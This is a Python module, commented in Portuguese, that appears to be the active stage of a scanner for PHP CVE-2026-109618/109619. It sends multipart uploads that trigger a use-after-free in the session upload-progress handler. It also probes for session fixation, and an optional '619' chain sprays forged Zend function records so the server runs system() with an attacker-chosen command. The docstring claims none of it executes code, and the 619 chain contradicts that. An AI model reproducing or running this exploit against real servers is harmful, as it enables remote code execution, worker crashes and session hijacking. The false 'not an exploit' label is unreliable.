#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell_active - camada ativa de CVE-2026-109618 / CVE-2026-109619
====================================================================

Complementa php2shell.py (fingerprint passivo + oráculo leve) com as sondas
ativas. Nada aqui é exploit: nenhuma executa código.

  stall  - POST multipart em duas fases, com pausa > 1s entre elas
           (FILE_START + FILE_DATA parcial | pausa | FILE_DATA final).
           É o caminho do use-after-free em php_session_rfc1867_callback.
  micro  - POST único de ~290 bytes com PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
           (estilo writeup / Zer061), útil em lab com min_freq=0.
  inject - PHPSESSID no corpo, sem header Cookie. Se o servidor devolver o
           nosso SID em Set-Cookie, a primitiva de fixação está viva.
  619    - opcional: spray de 149 registros forjados + ponteiro obsoleto para
           zend_call_function -> zif_system. É o único que exige offset do build.

O stall pode abortar o worker prefork atual - é o comportamento esperado, não
um efeito colateral.

REFERÊNCIAS
  https://vexday.io/pt/cve/CVE-2026-109618
  https://github.com/murrez/php2shell
  https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC
"""

from __future__ import annotations

import socket
import ssl
import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple
from urllib.parse import urlparse

from php2shell import _join, _normalize

__all__ = [
    "active_scan", "discover_paths", "probe_stall", "probe_micro", "probe_inject",
    "probe_619", "build_stall_body", "build_micro_body", "build_inject_body",
    "build_619_body", "forge_record", "resolve_call_addr", "score_attempt",
    "active_verdict", "command_fits_inline", "ACTIVE_STATUSES",
]

# --------------------------------------------------------------------------- #
# Constantes (mesmos parâmetros do PoC público)
# --------------------------------------------------------------------------- #
FILLUNIT = 5120
BOUNDARY_TRIGGER = b"----cyberpm-php2shell"
BOUNDARY_MICRO = b"----cyberpm-micro"
BOUNDARY_INJECT = b"----cyberpm-inject"
BOUNDARY_619 = b"Cyberpm619"

DEFAULT_STALL = 1.5
DEFAULT_TIMEOUT = 10.0
READ_CAP = 32768
BODY_CAP = 8192

N149_SPRAY = 149
FORGE_BLOB = 288
DELTA_CALL_DEFAULT = 0x43EF0      # zval_ptr_dtor - zend_call_function (build do lab)
MAX_INLINE_CMD = 14               # limite do PoC do eness para comando inline

DEFAULT_PATHS = ("/index.php", "/", "/wp-login.php", "/wp-admin/admin-ajax.php")

SCORE = {
    "rce_hit": 100,
    "armed": 100,
    "crash_signal": 70,
    "session_fixation": 50,
    "upload_accepted": 30,
    "http_ok": 10,
}

STRONG = ("rce_hit", "armed", "session_fixation")
ACTIVE_STATUSES = frozenset(
    ("rce_hit", "armed", "session_fixation", "crash_signal", "upload_accepted",
     "inconclusive", "unreachable", "bad_args", "skipped")
)
ACCEPTED_CODES = (200, 201, 204, 301, 302, 303, 307, 400, 401, 403, 500)


# --------------------------------------------------------------------------- #
# HTTP mínimo por socket (o stall entre fases exige controle do stream)
# --------------------------------------------------------------------------- #
@dataclass
class RawResponse:
    status: int = 0
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    elapsed: float = 0.0
    error: str = ""
    crashed: bool = False
    session_fixation: bool = False


def _request_path(url: str) -> str:
    parts = urlparse(url)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    return path


def _open(url: str, timeout: float, verify_tls: bool = True):
    parts = urlparse(url)
    scheme = (parts.scheme or "http").lower()
    host = parts.hostname or "127.0.0.1"
    port = parts.port or (443 if scheme == "https" else 80)
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.settimeout(timeout)
    try:
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    if scheme == "https":
        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=host)
        sock.settimeout(timeout)
    else:
        sock = raw
    default_port = (scheme == "http" and port == 80) or (scheme == "https" and port == 443)
    return sock, (host if default_port else f"{host}:{port}")


def _send_all(sock: socket.socket, data: bytes) -> None:
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        got = sock.send(view[sent:])
        if got == 0:
            raise ConnectionError("socket fechado durante o envio")
        sent += got


def _recv_http(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    buf = bytearray()
    header_end: Optional[int] = None
    while len(buf) < READ_CAP:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError, ssl.SSLError, OSError):
            break
        if not chunk:
            break
        buf.extend(chunk)
        if header_end is None and b"\r\n\r\n" in buf:
            header_end = buf.index(b"\r\n\r\n") + 4
        if header_end is not None and len(buf) >= header_end + BODY_CAP:
            break
    return bytes(buf)


def _parse_http(raw: bytes) -> Tuple[int, str, bytes, Dict[str, str]]:
    headers: Dict[str, str] = {}
    if not raw or b"\r\n" not in raw:
        return 0, "", b"", headers
    head, _, rest = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    parts = lines[0].decode("latin-1", "replace").split(" ", 2)
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""
    for line in lines[1:]:
        if b":" in line:
            key, value = line.split(b":", 1)
            headers[key.decode("latin-1", "replace").lower()] = value.decode(
                "latin-1", "replace").strip()
    return code, reason, rest, headers


def _fixation_from_headers(headers: Dict[str, str], session_id: str) -> bool:
    raw = headers.get("set-cookie", "")
    return bool(raw) and session_id.lower() in raw.lower() and "phpsessid" in raw.lower()


def _fixation_from_cookies(cookies: Sequence[str], session_id: str) -> bool:
    return any(session_id.lower() in c.lower() and "phpsessid" in c.lower()
               for c in cookies or ())


def _crashed(raw: bytes, status: int) -> bool:
    # Sem um byte de resposta com a conexão viva = o worker morreu no meio.
    return (not raw) or status in (502, 503, 504)


# --------------------------------------------------------------------------- #
# Montagem dos corpos multipart (funções puras)
# --------------------------------------------------------------------------- #
def _part(boundary: bytes, name: str, body: bytes,
          filename: Optional[str] = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_stall_body(session_id: str, *, boundary: bytes = BOUNDARY_TRIGGER,
                     progress_key: str = "cyberpm", phase1_extra: int = 128,
                     phase2_multiplier: int = 2) -> Tuple[bytes, bytes]:
    """Fase 1 (cabeçalho + FILE_START + FILE_DATA) e fase 2 (FILE_DATA + fim).

    O campo PHP_SESSION_UPLOAD_PROGRESS vem antes do arquivo, como o rfc1867
    exige, para o callback php_session_rfc1867_callback ser acionado.
    """
    hdr = _part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    hdr += _part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode()) + b"\r\n"
    hdr += (b"--" + boundary + b"\r\n"
            + b'Content-Disposition: form-data; name="file"; filename="cyberpm.bin"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n")
    phase1 = hdr + b"A" * (FILLUNIT + phase1_extra)
    phase2 = b"B" * (FILLUNIT * phase2_multiplier) + b"\r\n--" + boundary + b"--\r\n"
    return phase1, phase2


def build_micro_body(session_id: str, *, boundary: bytes = BOUNDARY_MICRO,
                     progress_key: str = "x") -> bytes:
    """~290 bytes, dois update() encostados (lab / min_freq=0)."""
    b = boundary.decode("ascii")
    h = f"--{b}\r\n"
    return (
        h + 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + session_id + "\r\n"
        + h + 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + progress_key + "\r\n"
        + h + 'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        + "Z\r\n"
        + f"--{b}--\r\n"
    ).encode("ascii")


def build_inject_body(session_id: str, *, boundary: bytes = BOUNDARY_INJECT,
                      progress_key: str = "x",
                      filename: str = "cyberpm_canary.txt") -> bytes:
    """Sonda de fixação: SID no corpo, sem Cookie no cabeçalho."""
    parts = _part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    parts += _part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode()) + b"\r\n"
    parts += _part(boundary, "f", b"Z", filename=filename) + b"\r\n"
    parts += b"--" + boundary + b"--\r\n"
    return parts


def forge_record(call_addr: int, command: bytes) -> bytes:
    """Blob de 288 bytes: zend_fcall_info + zend_internal_function forjados."""
    rec = bytearray(FORGE_BLOB)
    struct.pack_into("<Q", rec, 0, 64)             # fci
    struct.pack_into("<Q", rec, 8, call_addr)
    struct.pack_into("<I", rec, 16, 0x106)         # IS_STRING_EX
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, 1)             # ZEND_INTERNAL_FUNCTION
    struct.pack_into("<Q", rec, 152, call_addr)
    struct.pack_into("<I", rec, 160, 0x308)        # IS_OBJECT_EX
    payload = b"system\x00" + command + b"\x00"
    rec[200:200 + len(payload)] = payload[:80]
    return bytes(rec)


def build_619_body(session_id: str, command: bytes, call_addr: int, *,
                   boundary: bytes = BOUNDARY_619,
                   spray_count: int = N149_SPRAY) -> Tuple[bytes, bytes]:
    spray = forge_record(call_addr, command)
    if boundary in spray:
        raise ValueError("blob forjado colidiu com o boundary multipart")
    pre = _part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    pre += _part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(spray_count):
        pre += _part(boundary, "t[]", spray) + b"\r\n"
    pre += _part(boundary, "f", b"", filename="a") + b"\r\n"
    phase1 = pre + b"A" * (FILLUNIT + 64)
    phase2 = (b"B" * (FILLUNIT + 64) + b"C" * (FILLUNIT + 64)
              + b"\r\n--" + boundary + b"--\r\n")
    return phase1, phase2


def resolve_call_addr(dtor: Optional[int], call: Optional[int]) -> int:
    """Endereço de zend_call_function: direto ou derivado de zval_ptr_dtor."""
    if call and call > 0:
        return call & 0xFFFFFFFFFFFFFFFF
    if dtor and dtor > 0:
        return (dtor - DELTA_CALL_DEFAULT) & 0xFFFFFFFFFFFFFFFF
    return 0


def command_fits_inline(command: str) -> bool:
    return len(command.encode("utf-8")) <= MAX_INLINE_CMD


# --------------------------------------------------------------------------- #
# Transporte
# --------------------------------------------------------------------------- #
def _stall_post(url: str, phase1: bytes, phase2: bytes, session_id: str, *,
                boundary: bytes, stall: float, timeout: float, cookie: bool = True,
                stop: Optional[Callable[[], bool]] = None,
                verify_tls: bool = True,
                progress_url: Optional[str] = None,
                progress_key: str = "cyberpm") -> RawResponse:
    out = RawResponse()
    total = len(phase1) + len(phase2)
    start = time.time()
    try:
        sock, host = _open(url, timeout, verify_tls)
    except Exception as exc:
        out.error = f"{type(exc).__name__}: {exc}"
        out.elapsed = time.time() - start
        return out
    try:
        cookie_line = f"Cookie: PHPSESSID={session_id}\r\n" if cookie else ""
        head = (f"POST {_request_path(url)} HTTP/1.1\r\n"
                f"Host: {host}\r\n{cookie_line}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {total}\r\n"
                f"Connection: close\r\n\r\n").encode()
        _send_all(sock, head + phase1)

        slept = 0.0
        probe_at = max(0.1, min(0.4, stall * 0.3))
        probed = False
        while slept < stall:
            if stop is not None and stop():
                break
            step = min(0.1, stall - slept)
            time.sleep(step)
            slept += step
            if progress_url and not probed and slept >= probe_at:
                probed = True
                marker = _get_progress(url, progress_url, session_id, timeout, verify_tls)
                if f"upload_progress_{progress_key}" in marker:
                    out.headers["x-cyberpm-armed"] = "1"

        _send_all(sock, phase2)
        raw = _recv_http(sock, timeout)
    except Exception as exc:
        out.error = f"{type(exc).__name__}: {exc}"
        out.elapsed = time.time() - start
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass

    status, reason, body, headers = _parse_http(raw)
    out.status, out.reason, out.body, out.headers = status, reason, body, headers
    out.session_fixation = _fixation_from_headers(headers, session_id)
    out.crashed = _crashed(raw, status)
    out.elapsed = time.time() - start
    return out


def _simple_post(url: str, body: bytes, session_id: str, *, boundary: bytes,
                 timeout: float, cookie: bool = True,
                 stop: Optional[Callable[[], bool]] = None,
                 verify_tls: bool = True) -> RawResponse:
    out = RawResponse()
    start = time.time()
    try:
        sock, host = _open(url, timeout, verify_tls)
    except Exception as exc:
        out.error = f"{type(exc).__name__}: {exc}"
        out.elapsed = time.time() - start
        return out
    try:
        cookie_line = f"Cookie: PHPSESSID={session_id}\r\n" if cookie else ""
        head = (f"POST {_request_path(url)} HTTP/1.1\r\n"
                f"Host: {host}\r\n{cookie_line}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n").encode()
        _send_all(sock, head + body)
        raw = _recv_http(sock, timeout)
    except Exception as exc:
        out.error = f"{type(exc).__name__}: {exc}"
        out.elapsed = time.time() - start
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass

    status, reason, resp_body, headers = _parse_http(raw)
    out.status, out.reason, out.body, out.headers = status, reason, resp_body, headers
    out.session_fixation = _fixation_from_headers(headers, session_id)
    out.crashed = _crashed(raw, status)
    out.elapsed = time.time() - start
    return out


def _get_progress(base_url: str, path: str, session_id: str, timeout: float,
                  verify_tls: bool) -> str:
    """GET no endpoint de monitor (ex.: /check_progress.php?sid=...) durante o stall."""
    url = _join(base_url, path if path.startswith("/") else "/" + path)
    url += ("&" if "?" in url else "?") + "sid=" + session_id
    try:
        sock, host = _open(url, timeout, verify_tls)
    except Exception:
        return ""
    try:
        _send_all(sock, (f"GET {_request_path(url)} HTTP/1.1\r\nHost: {host}\r\n"
                         "Connection: close\r\n\r\n").encode())
        return _recv_http(sock, timeout).decode("latin-1", "replace")
    except Exception:
        return ""
    finally:
        try:
            sock.close()
        except OSError:
            pass


# --------------------------------------------------------------------------- #
# Attempt / pontuação / veredito (funções puras)
# --------------------------------------------------------------------------- #
@dataclass
class Attempt:
    variant: str
    url: str
    session_id: str
    path: str = "/"
    transport: str = "socket"
    status: int = 0
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    session_fixation: bool = False
    crashed: bool = False
    armed: bool = False
    score: int = 0
    elapsed: float = 0.0
    error: str = ""

    def as_dict(self) -> Dict[str, Any]:
        data = {k: v for k, v in self.__dict__.items() if k not in ("body", "headers")}
        data["body_bytes"] = len(self.body)
        return data


def _attempt(variant: str, url: str, session_id: str, res: RawResponse,
             *, expect: Optional[bytes] = None) -> Attempt:
    att = Attempt(
        variant=variant, url=url, session_id=session_id, path=_request_path(url),
        transport="socket", status=res.status, reason=res.reason,
        headers=dict(res.headers), body=res.body,
        session_fixation=res.session_fixation, crashed=res.crashed,
        armed=res.headers.get("x-cyberpm-armed") == "1",
        error=res.error, elapsed=res.elapsed,
    )
    att.score = score_attempt(att, expect=expect)
    return att


def score_attempt(att: Attempt, *, expect: Optional[bytes] = None) -> int:
    if att.error:
        return 0
    if att.armed:
        return SCORE["armed"]
    if expect and expect in att.body:
        return SCORE["rce_hit"]
    if att.crashed:
        return SCORE["crash_signal"]
    if att.session_fixation:
        return SCORE["session_fixation"]
    if att.status in ACCEPTED_CODES:
        return SCORE["upload_accepted"]
    if att.status:
        return SCORE["http_ok"]
    return 0


def active_verdict(best: Optional[Attempt], *, expect: Optional[bytes] = None) -> str:
    if best is None:
        return "unreachable"
    if expect and expect in best.body:
        return "rce_hit"
    if best.armed:
        return "armed"
    if best.error:
        return "unreachable"
    if best.crashed:
        return "crash_signal"
    if best.session_fixation:
        return "session_fixation"
    if best.status in ACCEPTED_CODES:
        return "upload_accepted"
    if best.status:
        return "inconclusive"
    return "unreachable"


# --------------------------------------------------------------------------- #
# Sondas públicas
# --------------------------------------------------------------------------- #
def probe_stall(url: str, *, stall: float = DEFAULT_STALL, timeout: float = DEFAULT_TIMEOUT,
                stop: Optional[Callable[[], bool]] = None, verify_tls: bool = True,
                session_id: Optional[str] = None, progress_key: str = "cyberpm",
                progress_url: Optional[str] = None,
                expect: Optional[bytes] = None) -> Attempt:
    sid = session_id or f"cybpm_{uuid.uuid4().hex[:12]}"
    phase1, phase2 = build_stall_body(sid, progress_key=progress_key)
    res = _stall_post(url, phase1, phase2, sid, boundary=BOUNDARY_TRIGGER,
                      stall=stall, timeout=timeout, stop=stop, verify_tls=verify_tls,
                      progress_url=progress_url, progress_key=progress_key)
    return _attempt("stall", url, sid, res, expect=expect)


def probe_micro(url: str, *, timeout: float = DEFAULT_TIMEOUT,
                stop: Optional[Callable[[], bool]] = None,
                verify_tls: bool = True,
                session_id: Optional[str] = None) -> Attempt:
    sid = session_id or f"cybmic_{uuid.uuid4().hex[:12]}"
    body = build_micro_body(sid)
    res = _simple_post(url, body, sid, boundary=BOUNDARY_MICRO, timeout=timeout,
                       stop=stop, verify_tls=verify_tls)
    return _attempt("micro", url, sid, res)


def probe_inject(url: str, *, timeout: float = DEFAULT_TIMEOUT,
                 stop: Optional[Callable[[], bool]] = None,
                 verify_tls: bool = True,
                 session_id: Optional[str] = None) -> Attempt:
    sid = session_id or f"cybinj_{uuid.uuid4().hex[:12]}"
    body = build_inject_body(sid)
    res = _simple_post(url, body, sid, boundary=BOUNDARY_INJECT, timeout=timeout,
                       cookie=False, stop=stop, verify_tls=verify_tls)
    return _attempt("inject", url, sid, res)


def probe_619(url: str, command: str, call_addr: int, *,
              stall: float = 1.35, timeout: float = DEFAULT_TIMEOUT,
              stop: Optional[Callable[[], bool]] = None, verify_tls: bool = True,
              session_id: Optional[str] = None,
              expect: Optional[bytes] = None) -> Attempt:
    sid = session_id or f"cyb619_{uuid.uuid4().hex[:12]}"
    phase1, phase2 = build_619_body(sid, command.encode(), call_addr)
    res = _stall_post(url, phase1, phase2, sid, boundary=BOUNDARY_619,
                      stall=stall, timeout=timeout, stop=stop, verify_tls=verify_tls)
    return _attempt("619", url, sid, res, expect=expect)


# --------------------------------------------------------------------------- #
# Orquestração
# --------------------------------------------------------------------------- #
def discover_paths(base_url: str, *, max_paths: int = 4,
                   extra: Sequence[str] = ()) -> List[str]:
    """Página informada primeiro; depois os entrypoints convencionais."""
    page = urlparse(base_url).path or "/"
    paths: List[str] = []
    if page not in ("/", ""):
        paths.append(page)
    for path in DEFAULT_PATHS:
        if path not in paths:
            paths.append(path)
    for path in extra:
        path = path if path.startswith("/") else "/" + path
        if path not in paths:
            paths.append(path)
    return paths[:max(1, max_paths)]


def _via_client(client: Any, variant: str, url: str, builder, *,
                cookie: bool = True) -> Attempt:
    """Executa micro/inject pelo HttpClient do chamador (preserva guardas do painel)."""
    sid = f"cyb{variant[:3]}_{uuid.uuid4().hex[:12]}"
    body = builder(sid)
    boundary = BOUNDARY_MICRO if variant == "micro" else BOUNDARY_INJECT
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
               "Content-Length": str(len(body))}
    if cookie:
        headers["Cookie"] = f"PHPSESSID={sid}"
    start = time.time()
    resp = client.post(url, body, headers=headers)
    att = Attempt(
        variant=variant, url=url, session_id=sid, path=_request_path(url),
        transport="urllib", status=resp.status, headers=dict(resp.headers),
        body=resp.body, error=resp.error, elapsed=time.time() - start,
        session_fixation=_fixation_from_cookies(resp.set_cookies, sid),
        crashed=resp.status in (502, 503, 504) or (resp.status == 0 and not resp.error),
    )
    att.score = score_attempt(att)
    return att


def active_scan(url: str, *, variants: Optional[Sequence[str]] = None,
                client: Optional[Any] = None,
                stop: Optional[Callable[[], bool]] = None,
                deadline: Optional[float] = None,
                chain: str = "618", call_addr: int = 0, command: str = "id",
                expect: Optional[bytes] = None, stall: float = DEFAULT_STALL,
                timeout: float = DEFAULT_TIMEOUT, verify_tls: bool = True,
                max_paths: int = 4, extra_paths: Sequence[str] = (),
                progress_path: Optional[str] = None,
                stop_on_signal: bool = True) -> Dict[str, Any]:
    """Executa as sondas ativas. Só promove veredito, nunca rebaixa."""
    base = _normalize(url)
    chain = (chain or "618").lower()

    if chain in ("619", "109619", "rce"):
        if call_addr <= 0:
            return {
                "status": "bad_args", "success": False, "best": None, "attempts": [],
                "probe_paths": [], "variants": ["619"], "requests": 0,
                "partial": False, "session_fixation_hits": 0, "crashes": 0,
                "chain": "619", "command": command, "call_addr": None,
                "command_inline_ok": command_fits_inline(command),
                "evidence": ["cadeia 619 exige --call (ou --dtor) do build do alvo"],
            }
        variants = ("619",)
    else:
        variants = tuple(variants or ("stall", "micro", "inject"))

    paths = discover_paths(base, max_paths=max_paths, extra=extra_paths)

    def _stopped() -> bool:
        if stop is not None and stop():
            return True
        return deadline is not None and (deadline - time.monotonic()) <= 0

    def _budget() -> float:
        if deadline is None:
            return timeout
        return max(0.5, min(timeout, deadline - time.monotonic()))

    attempts: List[Attempt] = []
    best: Optional[Attempt] = None
    requests = 0
    partial = False

    for path in paths:
        target_url = _join(base, path)
        for variant in variants:
            if _stopped():
                partial = True
                break
            try:
                if variant == "619":
                    att = probe_619(target_url, command, call_addr, stall=stall,
                                    timeout=_budget(), stop=stop,
                                    verify_tls=verify_tls, expect=expect)
                elif variant == "stall":
                    att = probe_stall(target_url, stall=stall, timeout=_budget(),
                                      stop=stop, verify_tls=verify_tls,
                                      progress_url=progress_path, expect=expect)
                elif variant == "micro" and client is not None:
                    att = _via_client(client, "micro", target_url, build_micro_body)
                elif variant == "inject" and client is not None:
                    att = _via_client(client, "inject", target_url, build_inject_body,
                                      cookie=False)
                elif variant == "micro":
                    att = probe_micro(target_url, timeout=_budget(), stop=stop,
                                      verify_tls=verify_tls)
                elif variant == "inject":
                    att = probe_inject(target_url, timeout=_budget(), stop=stop,
                                       verify_tls=verify_tls)
                else:
                    continue
            except Exception as exc:
                att = Attempt(variant=variant, url=target_url, session_id="",
                              error=f"{type(exc).__name__}: {exc}")
            requests += 1
            attempts.append(att)
            if best is None or att.score > best.score:
                best = att
            if stop_on_signal and att.score >= SCORE["session_fixation"]:
                break
        if stop_on_signal and best is not None and best.score >= SCORE["session_fixation"]:
            break

    status = active_verdict(best, expect=expect)
    evidence: List[str] = []
    if best is not None:
        evidence.append(
            f"sonda mais forte: {best.variant} em {best.path} -> "
            f"HTTP {best.status or 'sem resposta'} (pontuação {best.score})"
        )
        if best.session_fixation:
            evidence.append("Set-Cookie devolveu o PHPSESSID enviado: primitiva de fixação viva")
        if best.crashed:
            evidence.append("conexão encerrada sem resposta (502/503/504 ou 0 bytes): worker instável")
        if best.armed:
            evidence.append("endpoint de monitor mostrou upload_progress_* durante o stall")
        if expect and expect in best.body:
            evidence.append("marcador do comando encontrado no corpo da resposta")
    if status == "upload_accepted":
        evidence.append("multipart chegou ao PHP, mas sem sinal forte de UAF")
    if status == "unreachable":
        evidence.append("nenhuma sonda obteve resposta utilizável")

    return {
        "status": status,
        "success": status in STRONG,
        "best_score": best.score if best else 0,
        "best": best.as_dict() if best else None,
        "attempts": [a.as_dict() for a in attempts[:40]],
        "probe_paths": paths,
        "variants": list(variants),
        "requests": requests,
        "partial": partial,
        "session_fixation_hits": sum(1 for a in attempts if a.session_fixation),
        "crashes": sum(1 for a in attempts if a.crashed),
        "chain": chain,
        "command": command if chain != "618" else None,
        "call_addr": hex(call_addr) if call_addr else None,
        "command_inline_ok": command_fits_inline(command),
        "evidence": evidence,
    }